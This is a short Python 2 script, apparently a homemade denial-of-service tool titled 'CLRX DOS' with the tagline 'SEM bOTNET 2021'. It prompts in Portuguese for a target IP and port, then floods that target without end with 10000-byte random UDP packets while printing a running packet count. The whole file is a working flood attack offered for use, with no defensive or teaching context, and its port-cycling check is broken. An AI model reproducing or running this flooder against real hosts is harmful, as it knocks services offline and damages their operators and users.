import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)


print """
   _____   _        _____   __   __    _____     ____     _____ 
  / ____| | |      |  __ \  \ \ / /   |  __ \   / __ \   / ____|
 | |      | |      | |__) |  \ V /    | |  | | | |  | | | (___  
 | |      | |      |  _  /    > <     | |  | | | |  | |  \___ \ 
 | |____  | |____  | | \ \   / . \    | |__| | | |__| |  ____) |
  \_____| |______| |_|  \_\ /_/ \_\   |_____/   \____/  |_____/ """
print("SEM bOTNET 2021")

ip = raw_input("Ip Alvo : ")
port = input("Porta : ")
time.sleep(1)
print("DOS BY CLRX")
time.sleep(1)
sent = 100
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print "Enviando %s Pacotes No %s Na Porta %s"%(sent,ip,port)
     if port == 65534:
       port = 1
